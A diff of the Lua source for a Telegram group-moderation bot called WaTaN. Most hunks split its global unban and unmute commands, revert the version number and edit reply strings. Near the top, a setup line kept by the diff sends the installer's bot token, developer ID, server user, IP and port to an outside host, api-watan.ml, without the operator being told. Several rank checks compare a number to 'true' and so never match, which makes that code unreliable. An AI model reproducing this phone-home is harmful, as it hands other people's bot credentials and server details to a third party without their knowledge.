@@ -67,7 +67,7 @@ token = database:get(Server.."Token_Write"),
 SUDO = database:get(Server.."UserSudo_Write"),
 }
 Create(Config, "./Info.lua") 
-https.request("https://api-watan.ml/WaTaN/index.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&token="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
+https.request("https://api-watan.ml/WaTaN/index.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 print("::WaTaN::")
 local RunWaTaN = io.open("WaTaN", 'w')
 RunWaTaN:write([[
@@ -122,9 +122,6 @@ return var
 end
 Load_File() 
 ----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
------ لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
------ لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
------ لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
 print([[
 ╔╗╔╗╔╗     ╔════╗     ╔═╗ ╔╗
 ║║║║║║     ║╔╗╔╗║     ║║╚╗║║
@@ -135,10 +132,8 @@ print([[
                                
 > CH › @WaTaNTeaM
 ~> DEVELOPER › @abbasfadhil
-~~> Source Version 2.9
-لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ
-لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ
-
+~~> Source Version 2.7
+لا ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ
 ]])
 sudos = dofile("./Info.lua") 
 SUDO = tonumber(sudos.SUDO)
@@ -4309,27 +4304,25 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-if text == ("الغاء العام") and ChanSub(msg) and msg.reply_to_message_id_ and DevWaTaN(msg) then
+if text == "الغاء كتم عام" and ChanSub(msg) or text == "الغاء الكتم العام" and ChanSub(msg) or text == "الغاء كتم العام" and ChanSub(msg) and msg.reply_to_message_id_ and DevWaTaN(msg) then
 function start_function(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
-status  = '\n✯︙تم الغاء (الحظر-الكتم) عام من الكروبات'
+status  = '\n✯︙تم الغاء كتمه عام من الكروبات'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
-database:srem(bot_id..'GBan:User', result.sender_user_id_)
 database:srem(bot_id..'Gmute:User', result.sender_user_id_)
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
 return false
 end
-if text and text:match("^الغاء العام @(.*)$") and ChanSub(msg) and DevWaTaN(msg) then
-local username = text:match("^الغاء العام @(.*)$") 
+if text and text:match("^الغاء كتم عام @(.*)$") and ChanSub(msg) and DevWaTaN(msg) or text:match("الغاء الكتم العام @(.*)$") and ChanSub(msg) and DevWaTaN(msg) or text:match("الغاء كتم العام @(.*)$") and ChanSub(msg) and DevWaTaN(msg) then
+local username = text:match("^الغاء كتم عام @(.*)$") or text:match("الغاء الكتم العام @(.*)$") or text:match("الغاء كتم العام @(.*)$")
 function start_function(extra, result, success)
 if result.id_ then
 usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
-status  = '\n✯︙تم الغاء (الحظر-الكتم) عام من الكروبات'
+status  = '\n✯︙تم الغاء كتمه عام من الكروبات'
 texts = usertext..status
-database:srem(bot_id..'GBan:User', result.id_)
 database:srem(bot_id..'Gmute:User', result.id_)
 else
 texts = '✯︙لا يوجد حساب بهذا المعرف'
@@ -4339,10 +4332,52 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 return false
 end
-if text and text:match("^الغاء العام (%d+)$") and ChanSub(msg) and DevWaTaN(msg) then
-local userid = text:match("^الغاء العام (%d+)$")
-database:srem(bot_id..'GBan:User', userid)
+if text and text:match("^الغاء كتم عام (%d+)$") and ChanSub(msg) and DevWaTaN(msg) or text:match("^الغاء الكتم العام (%d+)$") and ChanSub(msg) and DevWaTaN(msg) or text:match("^الغاء كتم العام (%d+)$") and ChanSub(msg) and DevWaTaN(msg) then
+local userid = text:match("^الغاء كتم عام (%d+)$") or text:match("^الغاء الكتم العام (%d+)$") or text:match("^الغاء كتم العام (%d+)$")
 database:srem(bot_id..'Gmute:User', userid)
+tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
+if data.first_name_ then
+usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
+status  = '\n✯︙تم الغاء كتمه عام من الكروبات'
+send(msg.chat_id_, msg.id_, usertext..status)
+else
+usertext = '\n✯︙العضو » '..userid..''
+status  = '\n✯︙تم حظره عام من الكروبات'
+send(msg.chat_id_, msg.id_, usertext..status)
+end;end,nil)
+return false
+end
+if text == "الغاء حظر عام" and ChanSub(msg) or text == "الغاء الحظر العام" and ChanSub(msg) or text == "الغاء حظر العام" and ChanSub(msg) and msg.reply_to_message_id_ and DevWaTaN(msg) then
+function start_function(extra, result, success)
+tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
+usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
+status  = '\n✯︙تم الغاء حظره عام من الكروبات'
+send(msg.chat_id_, msg.id_, usertext..status)
+end,nil)
+database:srem(bot_id..'GBan:User', result.sender_user_id_)
+end
+tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
+return false
+end
+if text and text:match("^الغاء حظر عام @(.*)$") and ChanSub(msg) and DevWaTaN(msg) or text:match("الغاء الحظر العام @(.*)$") and ChanSub(msg) and DevWaTaN(msg) or text:match("الغاء حظر العام @(.*)$") and ChanSub(msg) and DevWaTaN(msg) then
+local username = text:match("^الغاء حظر عام @(.*)$") or text:match("الغاء الحظر العام @(.*)$") or text:match("الغاء حظر العام @(.*)$")
+function start_function(extra, result, success)
+if result.id_ then
+usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
+status  = '\n✯︙تم الغاء حظره عام من الكروبات'
+texts = usertext..status
+database:srem(bot_id..'GBan:User', result.id_)
+else
+texts = '✯︙لا يوجد حساب بهذا المعرف'
+end
+send(msg.chat_id_, msg.id_, texts)
+end
+tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
+return false
+end
+if text and text:match("^الغاء حظر عام (%d+)$") and ChanSub(msg) and DevWaTaN(msg) or text:match("^الغاء الحظر العام (%d+)$") and ChanSub(msg) and DevWaTaN(msg) or text:match("^الغاء حظر العام (%d+)$") and ChanSub(msg) and DevWaTaN(msg) then
+local userid = text:match("^الغاء حظر عام (%d+)$") or text:match("^الغاء الحظر العام (%d+)$") or text:match("^الغاء حظر العام (%d+)$")
+database:srem(bot_id..'GBan:User', userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
 usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
@@ -4355,6 +4390,7 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
+
 ----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
 if text == ("مسح المطورين") and ChanSub(msg) and DevWaTaN(msg) then
 database:del(bot_id..'Sudo:User')
@@ -9008,16 +9044,16 @@ send(msg.chat_id_,msg.id_,t)
 end,nil)
 end
 
-if text and text:match("^تنزيل الكل @(.*)$") and ChanSub(msg) and Manager(msg) then
+if text and text:match("^تنزيل الكل @(.*)$") and Manager(msg) then
 function start_function(extra, result, success)
 if (result.id_) then
 if tonumber(result.id_) == true then
-send(msg.chat_id_, msg.id_,"✯︙لا تستطيع تنزيل المطور الاساسي")
+send(msg.chat_id_, msg.id_,"℘︙ لا تستطيع تنزيل المطور الاساسي")
 return false 
 end
 if database:sismember(bot_id.."Sudo:User",result.id_) then
 dev = "المطور ،" else dev = "" end
-if database:sismember(bot_id.."CoSu"..msg.chat_id_,result.id_) then
+if database:sismember(bot_id.."CoSu",result.id_) then
 cu = "المالك ،" else cu = "" end
 if database:sismember(bot_id.."Basic:Constructor"..msg.chat_id_, result.id_) then
 crr = "منشئ اساسي ،" else crr = "" end
@@ -9033,12 +9069,12 @@ if database:sismember(bot_id..'Special:User'..msg.chat_id_, result.id_) then
 vip = "مميز ،" else vip = ""
 end
 if Can_or_NotCan(result.id_,msg.chat_id_) ~= false then
-send(msg.chat_id_, msg.id_,"\n✯︙تم تنزيل الشخص من الرتب التاليه \n✯︙{ "..dev..""..crr..""..cr..""..own..""..mod..""..mn..""..cu..""..vip.." } \n")
+send(msg.chat_id_, msg.id_,"\n℘︙ تم تنزيل الشخص من الرتب التاليه \n℘︙  { "..dev..""..crr..""..cr..""..own..""..mod..""..mn..""..vip.." } \n")
 else
-send(msg.chat_id_, msg.id_,"\n✯︙عذرا العضو لايملك رتبه \n")
+send(msg.chat_id_, msg.id_,"\n℘︙  عذرا العضو لايملك رتبه \n")
 end
 if tonumber(msg.sender_user_id_) == true then
-database:srem(bot_id.."Sudo:User", result.id_)
+database:srem(bot_id.."Sudo:User"..msg.chat_id_, result.id_)
 database:srem(bot_id.."CoSu"..msg.chat_id_, result.id_)
 database:srem(bot_id.."Basic:Constructor"..msg.chat_id_,result.id_)
 database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
@@ -9048,7 +9084,6 @@ database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.id_)
 database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
 elseif database:sismember(bot_id.."Sudo:User",msg.sender_user_id_) then
 database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.id_)
-database:srem(bot_id.."CoSu"..msg.chat_id_, result.id_)
 database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
 database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
 database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
@@ -9062,7 +9097,6 @@ database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
 database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
 database:srem(bot_id.."Basic:Constructor"..msg.chat_id_,result.id_)
 database:srem(bot_id.."CoSu"..msg.chat_id_, result.id_)
-database:sadd(bot_id.."CoSu"..msg.chat_id_, database:get(bot_id.."CoSuv"..msg.chat_id_))
 elseif database:sismember(bot_id.."Basic:Constructor"..msg.chat_id_, msg.sender_user_id_) then
 database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.id_)
 database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
@@ -10452,31 +10486,19 @@ local photps = (WaTaN.total_count_ or 0)
 local interaction = Total_Msg(Msguser)
 local rtpg = rtpa
 local WaTaNa = {
-" اروح فدوه للحلوين",
-" حلوة حبيبي معليك بالمضغوطين",
-" جهرتك منورة ",
-" هاي شكد حلو انتة",
-" كيكه وربي",
-" اصلا مطوري احلئ",
-" فديت الصاك محح",
-" فدشـي عمي",
-" دغيرها شبي هذا",
-" شهالگيمر ",
-" شهالصوره تخمبش ",
-" فديت الحلو ",
-" ببكن حلك ",
-" الخلقه الجميله كارثيه🤤",
-" والله مبين طاك ممكن اقطك؟",
-" حلاتك انته ولك🥺",
-" ثكيللل",
-" اححييييه الجماللل😍😍",
-" مو شاب ضيم براسك 60 حظ",
-" عود انت احلى مني شنو",
-" ما تتزوجني واني انطيك مهر؟ ",
-" ولكم اروح فدوه لهل جمال اني ",
-" يعني هسة انت بشر والي بالكروب بشر؟ ",
-" بعد ما اتحمل هل جمال اني عطلت ",
-" 😌مو احلى من ايلفن ",
+"اروح فدوه للحلوين",
+"حلوة حبيبي معليك بالمضغوطين",
+"جهرتك منورة ",
+"هاي شكد حلو انتة",
+"كيكه وربي",
+"اصلا مطوري احلئ",
+"فديت الصاك محح",
+"فدشـي عمي",
+"دغيرها شبي هذا",
+"شهالگيمر ",
+"شهالصوره تخمبش ",
+"فديت الحلو ",
+"ببكن حلك ",
 }
 local rdphoto = WaTaNa[math.random(#WaTaNa)]
 if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then      
@@ -11453,7 +11475,8 @@ Text = [[
 ✯︙اسم بوت + الرتبه
 ✯︙حظر عام
 ✯︙كتم عام
-✯︙الغاء العام
+✯︙الغاء : الحظر العام - حظر العام - حظر عام
+✯︙الغاء : الكتم العام - كتم العام - كتم عام
 ✯︙المحظورين عام
 ✯︙مسح المحظورين عام
 ✯︙مسح المكتومين عام
